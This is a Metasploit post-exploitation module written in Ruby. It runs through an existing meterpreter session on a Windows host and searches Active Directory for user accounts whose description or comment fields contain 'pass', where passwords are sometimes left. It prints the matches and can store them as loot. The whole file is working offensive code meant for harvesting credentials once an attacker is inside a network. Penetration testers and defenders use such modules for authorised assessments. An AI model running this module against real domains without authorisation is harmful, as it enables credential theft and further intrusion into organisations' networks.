##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super( update_info( info,
        'Name'	       => 'Windows Gather Active Directory User Comments',
        'Description'  => %Q{
          This module will enumerate user accounts in the default Active Domain (AD) directory which
        contain 'pass' in their description or comment (case-insensitive) by default. In some cases,
        such users have their passwords specified in these fields.
        },
        'License'      => MSF_LICENSE,
        'Author'       => [ 'Ben Campbell' ],
        'Platform'     => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'References'	=>
        [
          ['URL', 'http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx'],
        ]
      ))

    register_options([
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
      OptString.new('FIELDS', [true, 'Fields to retrieve.','userPrincipalName,sAMAccountName,userAccountControl,comment,description']),
      OptString.new('FILTER', [true, 'Search filter.','(&(&(objectCategory=person)(objectClass=user))(|(description=*pass*)(comment=*pass*)))']),
    ])
  end

  def run
    fields = datastore['FIELDS'].gsub(/\s+/,"").split(',')
    search_filter = datastore['FILTER']
    max_search = datastore['MAX_SEARCH']

    begin
      q = query(search_filter, max_search, fields)
      if q.nil? or q[:results].empty?
        return
      end
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      # Can't bind or in a network w/ limited accounts
      print_error(e.message)
      return
    end

    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
        'Header'     => "Domain Users",
        'Indent'     => 1,
        'SortIndex'  => -1,
        'Columns'    => fields
      )

    q[:results].each do |result|
      row = []

      result.each do |field|
        if field[:value].nil?
          row << ""
        else
          row << field[:value]

        end
      end

      results_table << row
    end

    print_line results_table.to_s

    if datastore['STORE_LOOT']
      stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)
      print_good("Results saved to: #{stored_path}")
    end
  end
end

